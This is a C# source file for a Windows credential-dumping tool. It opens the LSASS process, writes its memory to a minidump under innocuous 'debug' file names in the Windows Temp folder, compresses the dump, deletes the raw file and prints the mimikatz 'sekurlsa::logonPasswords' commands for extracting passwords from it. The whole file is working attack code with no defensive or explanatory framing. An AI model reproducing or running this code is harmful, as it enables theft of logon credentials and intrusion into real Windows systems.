using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ConsoleApp1
{
    public class Dumper
    {

        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Compress(string inFile, string outFile)
        {
            if (outFile=="")
                throw new InvalidOperationException(string.Format("outFile's name is empty"));
            byte[] bytes;
            try
            {
                bytes = File.ReadAllBytes(inFile);
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(string.Format("Problem with input file"));
            }
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(string.Format("[X] Exception while compressing file: {0}", ex.Message));
            }
        }

        public static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    throw new InvalidOperationException(string.Format("\n[X]Exception: {0}\n", ex.Message));
                }
            }

            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
            {
                Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                return;
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine(string.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = string.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
            string zipFile = string.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);

            Console.WriteLine(string.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                Console.WriteLine(string.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

                Compress(dumpFile, zipFile);

                Console.WriteLine(string.Format("[*] Deleting {0}", dumpFile));
                File.Delete(dumpFile);
                Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);

                string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string OS = "";
                var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                if (regKey != null)
                {
                    OS = string.Format("{0}", regKey.GetValue("ProductName"));
                }

                if (pid == -1)
                {
                    Console.WriteLine(string.Format("\n[*] Operating System : {0}", OS));
                    Console.WriteLine(string.Format("[*] Architecture     : {0}", arch));
                    Console.WriteLine(string.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                }
            }
            else
            {
                Console.WriteLine(string.Format("[X] Dump failed: {0}", bRet));
            }
        }
    }
}
